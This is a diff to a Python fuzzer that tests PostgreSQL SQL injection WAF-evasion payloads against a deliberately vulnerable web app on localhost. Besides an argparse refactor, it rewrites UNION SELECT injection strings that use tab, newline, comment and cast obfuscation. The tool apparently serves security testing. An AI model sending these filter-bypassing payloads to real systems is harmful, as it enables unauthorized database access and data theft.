@@ -4,6 +4,7 @@ PostgreSQL WAF Evasion HTTP Fuzzer
 Tests interesting obfuscation techniques through vulnerable web app.
 """
 
+import argparse
 import os
 import sys
 
@@ -11,6 +12,26 @@ import requests
 
 # Target URL - override with BASE_URL environment variable
 BASE_URL = os.environ.get("BASE_URL", "http://localhost:3000")
+
+
+def parse_args() -> argparse.Namespace:
+    """Parse command line arguments."""
+    parser = argparse.ArgumentParser(
+        description="PostgreSQL WAF Evasion HTTP Fuzzer - Tests obfuscation techniques through a vulnerable web app."
+    )
+    parser.add_argument(
+        "outfile",
+        nargs="?",
+        default="pg_waf_evasion_http_results.txt",
+        help="Output file for results (default: pg_waf_evasion_http_results.txt)",
+    )
+    parser.add_argument(
+        "-f",
+        "--force",
+        action="store_true",
+        help="Overwrite output file if it already exists",
+    )
+    return parser.parse_args()
 
 
 def validate_outfile(path: str, force: bool = False) -> str:
@@ -110,15 +131,9 @@ def test_payload(endpoint, param, payload, desc=None):
         return {**result_base, "success": False, "error": str(e)[:50]}
 
 
-def main():
-    # Parse arguments
-    args = sys.argv[1:]
-    force = "--force" in args
-    if force:
-        args.remove("--force")
-
-    outfile_arg = args[0] if args else "pg_waf_evasion_http_results.txt"
-    outfile = validate_outfile(outfile_arg, force=force)
+def main() -> int:
+    args = parse_args()
+    outfile = validate_outfile(args.outfile, force=args.force)
 
     print("PostgreSQL WAF Evasion HTTP Fuzzer")
     print(f"Target: {BASE_URL}")
@@ -408,9 +423,9 @@ def main():
         ("0 UNION SELECT '1'::int,$$test$$,$$t@t.com$$,$$user$$--", "UNION + ::int"),
         # With scientific notation
         ("0e0 UNION SELECT 1,$$test$$,$$t@t.com$$,$$user$$--", "0e0 UNION"),
-        # With whitespace alternatives
-        ("0%09UNION%09SELECT%091,$$test$$,$$t@t.com$$,$$user$$--", "UNION + tab"),
-        ("0%0aUNION%0aSELECT%0a1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + newline"),
+        # With whitespace alternatives (use raw chars, not URL-encoded, to avoid double-encoding)
+        ("0\tUNION\tSELECT\t1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + tab"),
+        ("0\nUNION\nSELECT\n1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + newline"),
         # Comment-based
         ("0/**/UNION/**/SELECT/**/1,$$test$$,$$t@t.com$$,$$user$$--", "UNION + /**/"),
         ("0 UNION--\nSELECT 1,$$test$$,$$t@t.com$$,$$user$$", "UNION--\\nSELECT"),
@@ -443,7 +458,7 @@ def main():
             "/**/ + unicode tags",
         ),
         (
-            "0%09UNION%09SELECT%09'1'::int,$$test$$,$$t@t.com$$,$$user$$--",
+            "0\tUNION\tSELECT\t'1'::int,$$test$$,$$t@t.com$$,$$user$$--",
             "tab + cast + $$",
         ),
         ("ABS(-1) OR pg_catalog.length(username)>0--", "func + schema-qualified"),
